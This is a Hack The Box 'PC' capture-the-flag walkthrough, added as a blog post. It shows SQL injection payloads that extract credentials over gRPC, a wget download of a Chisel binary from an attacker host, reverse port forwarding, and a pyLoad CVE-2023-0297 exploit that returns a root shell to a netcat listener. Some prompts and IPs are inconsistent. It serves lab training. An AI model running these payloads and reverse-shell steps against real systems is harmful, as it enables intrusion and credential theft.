@@ -1,0 +1,193 @@
+---
+title: Hack The Box - PC
+date: 2023-10-03 13:33:37 +/-TTTT
+categories:
+  - Hack The Box
+tags:
+  - HTB
+comments: true
+image:
+  path:
+  show_in_post: true
+---
+
+HTB PC Machine - https://www.hackthebox.com/machines/pc
+
+### Scanning & Enumeration
+Scan the machine with Nmap tool
+```
+nmap -A -p- -Pn -T4 10.10.11.214
+```
+
+Output is:
+`22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)`  
+`50051/tcp open unknown`
+
+Noticed that port 50051 is the default port for the `gRPC` channel. After some research on google, i found
+	`https://documentation.softwareag.com/webmethods/compendiums/v10-11/C_API_Management/index.html#page/api-mgmt-comp/to-grpc_configuration_7.html`
+
+And then, I found a way to access the server using tools called `grpcui` or `gRPC` UI. <https://github.com/fullstorydev/grpcui>
+```
+grpcui -plaintext 10.10.11.214:50051
+```
+It will automatically open up a web page.
+
+### Exploitation & Gaining Access
+After playing around with the UI interface, I realized that I can request the data using the credentials `admin:admin`.
+This resulted in a response with a user token and an ID number.
+Thence, I started intercepting using Burp Suite with the token and ID in the method `getInfo()`.
+
+I realized there might be an SQL injection vulnerability in the parameter `id`. so I tried some payloads.
+
+payload:
+```
+{
+"id": "500 union SELECT username FROM accounts WHERE username NOT like 'sqlite_%' limit 1--"
+}
+```
+
+result:
+```
+{
+
+"message": "admin"
+}
+```
+We can get the first user in the accounts table. let's try to get the second user and its password.
+
+payload:
+```
+{
+"id": "500 union SELECT username FROM accounts LIMIT 1 OFFSET 1;"
+}
+```
+
+result:
+```
+{
+"message": "sau"
+}
+```
+We have got the second username let's get his password.
+
+payload:
+```
+{
+"id": "500 union SELECT password FROM accounts where username='sau';"
+}
+```
+
+Result:
+```
+{
+"message": "HereIsYourPassWord1431"
+}
+```
+
+So we have Sau's password let's try to login using SSH.
+```
+ssh sau@10.10.11.214
+Password: HereIsYourPassWord1431
+
+sau@pc~$ ls
+sau@pc~$ cat user.txt
+```
+
+### Privilege Escalation
+To list all the files on the system that have the SUID bit set.
+```
+sau@pc~$ find / -perm /4000 2>/dev/nul
+```
+
+After doing some enumeration I didn't find anything. so lets try to enumerate open ports
+```
+sau@pc~$ netstat -tulpn
+```
+
+Output:
+`(Not all processes could be identified, non-owned process info`  
+`will not be shown, you would have to be root to see it all.)`  
+`Active Internet connections (only servers)`  
+`Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name`  
+`tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN -`  
+`tcp 0 0 0.0.0.0:9666 0.0.0.0:* LISTEN -`  
+
+we have service running on port 8000, let's do port forwarding to figure out what is it.
+
+#### Port Forwarding
+Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. https://github.com/jpillora/chisel/releases/tag/v1.7.7
+
+Download and extracting both files, from our kali to the HTB machine, we should now have a 32-bit and 64-bit version of Chisel on our attacker machine.
+```
+scp /home/kali/Desktop/chisel sau@10.10.11.214:/tmp
+Password: HereIsYourPassWord1431
+```
+
+OR
+Download the 64-bit version on the victim's machine, and launch a simple local HTTP server on the attacker's machine.
+```
+python3 -m http.server 8080
+```
+
+then we will download the Chisel file in the victim's machine using wget.
+```
+sau@pc~$ wget <http://10.10.16.47:8080/chisel>
+```
+
+Next we need to give this execute permissions, like so:
+```
+sau@pc~$ chmod +x ./chisel
+```
+We have chisel on the victim
+
+Now that we have both versions on our target HTB machine, we can  check the architecture of the HTB machine using
+```
+sau@pc~$ uname -a
+```
+
+Now we need to download chisel onto our kali
+```
+sau@pc~$ go install github.com/jpillora/chisel@latest
+```
+
+Now we just setup our port forwarding on our attacker machine.
+
+With Chisel, we will be setting up a server on our attacker machine and a client on the victim machine. We can set the server up on any port; however, because chisel tunnels over HTTP, we may get stuffed by the firewall so its smart to use common ports like 80, 443, 21, etc.
+```
+sau@pc~$ chisel server -p 80 --reverse
+```
+
+now we need to setup the port forwarding on the victim machine. We can send port 8000 to our attacker machine like that
+```
+./chisel client 10.10.16.4:80 R:8000:127.0.0.1:8000
+```
+
+Here we can see the victim has connected to our kali machine, and if we check the open ports using netstat again on our attacker machine
+```
+sau@pc~$ netstat -tulpn
+```
+We should see `127.0.0.1:8000` running.
+
+#### Accessing the Internal Service
+Access the server on the browser by entering the following URL: http://127.0.0.1:8000/
+
+![[Pasted image 20250816233102.png]]
+
+After trying the default credentials without success, I conducted a search for vulnerabilities and discovered that `pyLoad` page has a vulnerability (CVE-2023-0297) and got an exploit to this CVE using Python: https://github.com/JacobEbben/CVE-2023-0297
+
+So set up a listener on port 9999 on our kali machine
+```
+nc -lnvp 9999
+```
+
+Run the exploit
+```
+python3 exploit.py -t <http://127.0.0.1:8000> -I 10.10.16.4 -P 9999
+```
+
+We got a shell on our listener
+```
+root@pc:~# cd /
+root@pc:~# cd root
+root@pc:~# cat root.txt
+```
